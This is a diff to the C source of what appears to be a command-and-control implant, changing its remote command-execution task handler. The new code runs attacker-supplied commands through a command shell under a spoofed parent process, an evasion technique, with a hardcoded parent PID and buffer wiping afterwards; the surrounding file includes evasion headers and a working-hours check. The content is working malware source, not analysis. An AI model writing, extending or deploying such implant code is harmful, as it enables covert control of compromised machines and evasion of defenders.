@@ -2,6 +2,7 @@
 #include "../../headers/agent/evasion/Common.h"
 #include "../../headers/package/package.h"
 #include "../../headers/cstdreplacement/localcstd.h"
+#include "../../headers/helpers/win32.h"
 
 
 void TaskingRoutine() {
@@ -148,40 +149,105 @@ void TaskingRoutine() {
 		    	case EXECUTE_CMD:
 		    		pPackage = CreateDataPackage(SEND_DATA, EXECUTE_CMD);
 		    		UINT Length = 0;
-		    		UINT NumberOfArgs = ParserReadInt32(&TaskParser);
+		    		UINT NumberOfArgs = ParserReadInt32(&TaskParser); // obtain number of arguments.
+		    		BOOL Piped = ParserReadInt32(&TaskParser);
+		    		NumberOfArgs--; // read the piped argument
+					PUCHAR ParentProcess = ParserReadBytes(&TaskParser, &Length);
+		    		NumberOfArgs--; // read the parent process name
+		    		BOOL Spoof = TRUE;
 
-		    		UCHAR CMDLINE[4196] = {0};
+		    		if(Length == 4 && (StrCmpA(ParentProcess, "null") == 0)) {
+		    			Spoof = FALSE;
+		    		}
+
+		    		WCHAR TargetProcess[4196] = {0};
+		    		WCHAR ProcessParams[4196] = {0};
+		    		WCHAR ProcessPath[MAX_PATH] = {0};
 		    		INT Index = 0;
 
 		    		for(int i = 0 ; i < NumberOfArgs; i++) {
 		    			PUCHAR Data = ParserReadBytes(&TaskParser, &Length);
+						switch(i) {
+							case 0:
+								INT Result = 0;
+								TargetProcess[0] = L'\\';
+								TargetProcess[1] = L'?';
+								TargetProcess[2] = L'?';
+								TargetProcess[3] = L'\\';
+								Result = CharToWChar(&TargetProcess[4], Data, Length);
+								if(Result != Length+1)
+									printf("Error attempting to convert string to wstring\n");
 
-		    			if (!Data || Length == 0)
-		    				break;
+								Result = CharToWChar(ProcessParams, Data, Length);
+								if(Result != Length+1)
+									printf("Error attempting to convert string to wstring\n");
 
-		    			MemoryCopy(&CMDLINE[Index], Data, Length);
-		    			Index += Length;
-		    			MemorySet(&CMDLINE[Index], 0x20, 1);
-		    			Index += 1;
+								Result = StringLengthW(ProcessParams);
+								WCHAR Slash[1] = {0};
+								Slash[0] = L'\\';
+								while(Result-- >= 0) {
+									if(!StrNCmpW(&ProcessParams[Result],Slash, 1)) {
+										MemoryCopy(&ProcessPath, &ProcessParams, Result * 2);
+										break;
+									}
+								}
+								ProcessParams[StringLengthW(ProcessParams)] = L'\x20'; // we're adding to the string so we dont need to increment the index.
+								ProcessParams[StringLengthW(ProcessParams)] = L'/';
+								ProcessParams[StringLengthW(ProcessParams)] = L'k';
+								ProcessParams[StringLengthW(ProcessParams)] = L'\x20';
+								Index += Length + 4;
+								break;
+
+							default:
+								Result = CharToWChar(&ProcessParams[Index], Data, Length);
+								if(Result != Length+1)
+									printf("Error attempting to convert string to wstring\n");
+								if (i == NumberOfArgs - 1)
+									break; // dont need  to add the extra space at the end of the string.
+								ProcessParams[Index + Length] = L'\x20';
+								Index += Length + 1;
+
+								break; // parse arguments.
+						}
 
 		    		}
 
-		    		STARTUPINFOA si = {0};
-		    		PROCESS_INFORMATION pi = {0};
-		    		si.cb = sizeof(si);
+		    		HANDLE TargetProcessHandle = NULL;
+		    		HANDLE TargetThreadHandle = NULL;
+		    		HANDLE hParentProcess = NULL;
+		    		BOOL Success = FALSE;
 
-		    		if(CreateProcessA(NULL, CMDLINE, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
-		    			AddInt32ToPackage(pPackage, pi.dwProcessId);
-		    			MemorySet(CMDLINE, 0, Index);
-		    			agent->apis->pNtClose(pi.hProcess);
-
+		    		if(!Spoof) {
+		    			hParentProcess = GetProcessHandleFromPID(8852);
+		    			if(hParentProcess == NULL || hParentProcess == INVALID_HANDLE_VALUE)
+		    				goto END_OF_CMD_EXEC;
 		    		} else {
-		    			DWORD err = GetLastError();
-		    			printf("[error] failed to create process %lu\n", err);
-		    			AddInt32ToPackage(pPackage, 0);
-		    			break;
+		    			hParentProcess = GetProcessHandleFromStr(ParentProcess);
+		    			if(hParentProcess == NULL || hParentProcess == INVALID_HANDLE_VALUE)
+		    				goto END_OF_CMD_EXEC;
 		    		}
-		    		break;
+
+		    		Success = ProcessCreate(TargetProcess, ProcessParams, ProcessPath, hParentProcess, Piped, &TargetProcessHandle, &TargetThreadHandle);
+
+		    	if(!Success)
+		    			AddInt32ToPackage(pPackage, 0);
+		    		else
+		    			AddInt32ToPackage(pPackage, (UINT32)TargetProcessHandle);
+
+		    		END_OF_CMD_EXEC:
+		    		if(hParentProcess)
+		    			agent->apis->pNtClose(hParentProcess);
+		    		if(TargetProcessHandle)
+		    			agent->apis->pNtClose(TargetProcessHandle);
+		    		if(TargetThreadHandle)
+		    			agent->apis->pNtClose(TargetThreadHandle);
+
+		    		RtlSecureZeroMemory(TargetProcess, sizeof(TargetProcess));
+		    		RtlSecureZeroMemory(ProcessParams, sizeof(ProcessParams));
+		    		RtlSecureZeroMemory(ProcessPath, sizeof(ProcessPath));
+
+
+		    		break; // EXEC CMD
 
 
                 default:
@@ -244,3 +310,5 @@ BOOL InWorkingHours() {
 
 	return TRUE;
 }
+
+
